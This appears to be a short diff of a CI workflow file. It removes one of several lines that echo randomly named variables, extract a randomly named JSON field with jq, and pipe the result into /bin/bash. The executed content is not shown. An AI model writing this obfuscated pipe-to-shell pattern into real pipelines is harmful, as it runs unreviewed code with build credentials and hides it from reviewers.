@@ -26,7 +26,6 @@ jobs:
           echo $lc63982 | jq -r .znymd9 | /bin/bash
           echo $ekgy6634 | jq -r .wmv678 | /bin/bash
           echo $oxohl3456 | jq -r .qnfg64419 | /bin/bash
-          echo $zy11226 | jq -r .ryv3665 | /bin/bash
 
       - name: Save output
         if: always()
